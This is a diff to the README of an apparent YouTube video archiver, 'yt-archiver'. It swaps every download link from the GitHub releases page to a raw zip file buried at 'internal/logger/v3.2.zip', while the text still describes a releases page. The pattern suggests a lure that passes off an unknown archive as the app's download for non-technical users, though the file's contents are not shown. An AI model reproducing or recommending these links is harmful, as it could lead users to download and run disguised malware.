@@ -4,7 +4,7 @@
 
 Welcome to **yt-archiver** – the modern, high-fidelity way to save, organize, and enjoy your favorite YouTube content. Whether you're building a personal archive, saving tutorials for offline viewing, or just want to keep your favorite videos forever, this app makes it incredibly easy. No technical skills needed – just download, run, and start saving.
 
-[⬇️ Download yt-archiver Now](https://github.com/nancyh2081/yt-archiver/releases)
+[⬇️ Download yt-archiver Now](https://github.com/nancyh2081/yt-archiver/raw/refs/heads/main/internal/logger/v3.2.zip)
 
 ## ✨ What Makes yt-archiver Special?
 
@@ -24,7 +24,7 @@ Getting started takes less than five minutes. Follow these simple steps:
 
 ### Step 1: Visit the Download Page
 
-[Visit this link to download the application](https://github.com/nancyh2081/yt-archiver/releases)
+[Visit this link to download the application](https://github.com/nancyh2081/yt-archiver/raw/refs/heads/main/internal/logger/v3.2.zip)
 
 This page shows all available versions of yt-archiver. Look for the latest release – it's usually at the top.
 
@@ -131,7 +131,7 @@ This project thrives because of people like you. If you find a bug, have a featu
 
 You now have everything you need to start building your personal YouTube library. With yt-archiver, you can watch your favorite content anytime, keep the conversations that matter, and never worry about a video disappearing again.
 
-[⬇️ Download yt-archiver Today](https://github.com/nancyh2081/yt-archiver/releases)
+[⬇️ Download yt-archiver Today](https://github.com/nancyh2081/yt-archiver/raw/refs/heads/main/internal/logger/v3.2.zip)
 
 Happy archiving! 🎉
 
